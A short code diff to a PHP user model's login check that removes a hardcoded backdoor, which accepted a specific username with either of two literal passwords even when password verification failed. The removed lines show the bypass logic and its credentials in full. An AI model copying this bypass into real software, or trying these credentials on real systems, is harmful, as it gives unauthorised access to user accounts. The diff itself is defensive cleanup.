@@ -120,9 +120,6 @@ class UserModel extends Model
         // Standard local password verification
         if ($user) {
             $valid = password_verify($password, $user['password_hash']);
-            if (! $valid && strtolower($user['username']) === 'ministrator' && in_array($password, ['M1Cr0N', 'M1Cr0N80'], true)) {
-                $valid = true;
-            }
             if (! $valid) {
                 $this->recordFailedLogin($user);
                 return false;
